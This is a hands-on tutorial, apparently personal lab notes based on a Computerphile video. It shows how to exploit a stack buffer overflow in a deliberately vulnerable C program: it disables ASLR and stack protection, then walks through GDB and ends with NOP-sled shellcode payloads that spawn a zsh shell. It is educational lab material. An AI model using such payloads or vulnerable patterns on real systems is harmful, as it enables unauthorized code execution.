
# Buffer Overflow test Tutorial

This tutorial is based on the Computerphile video, made by Dr. Mike Pound

https://www.youtube.com/watch?v=1S0aBV-Waeo

The tutorial will show you how to trigger and exploit a buffer overflow attack against a custom C program, using Kali Linux 32-bit PAE 2016.1.

Link:
https://www.offensive-security.com/kali-linux-vm-vmware-virtualbox-image-download/




## disable memory randomization, enable core dumps
http://securityetalii.es/2013/02/03/how-effective-is-aslr-on-linux-systems/
```shell
cat /proc/sys/kernel/randomize_va_space
sudo bash -c 'echo "kernel.randomize_va_space = 0" >> /etc/sysctl.conf'
sudo sysctl -p
cat /proc/sys/kernel/randomize_va_space
# verify "0"
ulimit -c unlimited
ulimit -c
# verify "unlimited"
```


## scripts

http://stackoverflow.com/questions/17775186/buffer-overflow-works-in-gdb-but-not-without-it

[envexec.sh]
```shell
#!/bin/sh

while getopts "dte:h?" opt ; do
  case "$opt" in
    h|\?)
      printf "usage: %s -e KEY=VALUE prog [args...]\n" $(basename $0)
      exit 0
      ;;
    t)
      tty=1
      gdb=1
      ;;
    d)
      gdb=1
      ;;
    e)
      env=$OPTARG
      ;;
  esac
done

shift $(expr $OPTIND - 1)
prog=$(readlink -f $1)
shift
if [ -n "$gdb" ] ; then
  if [ -n "$tty" ]; then
    touch /tmp/gdb-debug-pty
    exec env - $env TERM=screen PWD=$PWD gdb -tty /tmp/gdb-debug-pty --args $prog "$@"
  else
    exec env - $env TERM=screen PWD=$PWD gdb --args $prog "$@"
  fi
else
  exec env - $env TERM=screen PWD=$PWD $prog "$@"
fi
```





[vuln.c]
```c
#include <stdio.h>
#include <string.h>

int main (int argc, char** argv)
{
	char buffer[500];
	strcpy(buffer, argv[1]);

	return 0;
}
```

## Commands

```shell
# compile the code
gcc -z execstack -fno-stack-protector -mpreferred-stack-boundary=2 -g vuln.c -o vuln

# clean the environment, debug
chmod +x envexec.sh
./envexec.sh -d vuln

# clean the environment, execute exploit
./envexec.sh /root/vuln $(python ...)

# run gdb, load a program to analyze
gdb vuln
```

## GDB commands

```shell
# quit the debugger
quit

# clear the screen
ctrl + l
shell clear

# show debugging symbols, ie. code
list
list main

# show the assemlby code
disas main

# examine information
info os

info functions

info variables

# run the program, with input
run Hello

# run the overflow, seg fault
run $(python -c 'print "\x41" * 508')

# examine memory address
x/200x ($esp - 550)

# confirm overwrite of ebp register
info registers

# find a location, below ESP (stack pointer)
EDI = destination index, string / array copying
ESI = source index, string + array copying

EIP = index pointer, next address to execute
EBP = stack base pointer
ESP = stack pointer, starting in high memory, going down
EDX = data register

# run the overflow, launch a zsh shell
run $(python -c 'print "\x90" * 426 + "\x31\xc0\x83\xec\x01\x88\x04\x24\x68\x2f\x7a\x73\x68\x2f\x62\x69\x6e\x68\x2f\x75\x73\x72\x89\xe6\x50\x56\xb0\x0b\x89\xf3\x89\xe1\x31\xd2\xcd\x80\xb0\x01\x31\xdb\xcd\x80" + "\x51\x51\x51\x51" * 10')

# examine memory address
x/200x ($esp - 550)

# convert memeory address to little endian
ecx            0xbfffffc0	-1073741888
edx            0xbffffc3a	-1073742790
ebx            0xb7fb8000	-1208254464
esp            0xbffffc40	0xbffffc40
ebp            0x51515151	0x51515151

0xbf ff fa ba
\xba\xfa\xff\xbf


# run the exploit, execut /bin/zsh5
run $(python -c 'print "\x90" * 425 + "\x31\xc0\x83\xec\x01\x88\x04\x24\x68\x2f\x7a\x73\x68\x68\x2f\x62\x69\x6e\x68\x2f\x75\x73\x72\x89\xe6\x50\x56\xb0\x0b\x89\xf3\x89\xe1\x31\xd2\xcd\x80\xb0\x01\x31\xdb\xcd\x80" + "\xba\xfa\xff\xbf" * 10')
```



***Stack pointer***

-----------------------------------------------------------------------------------------------------------------------

```c
#include <stdio.h>
#include <stdlib.h>

unsigned long *get_stack_ptr(void) {
  __asm__(
    "mov %rsp, %rax"
  );
}

int main(int argc, char **argv) {
  unsigned long *stack_ptr = get_stack_ptr();

  printf("Size Of Ptr: %d bytes\n", sizeof(unsigned long *));
  printf("Stack Pointer: %llX\n", stack_ptr);

  return 0;
}
```
***EDP Check***

----------------------------------------------------------------------------------------------------------------------

```c
#include <stdlib.h>
#include <stdio.h>

void* getEIP () {
return __builtin_return_address(0)-0x5;
};

int main(int argc, char** argv){
printf("EBP located at: %p\n",getEIP());
return 0;
}
```
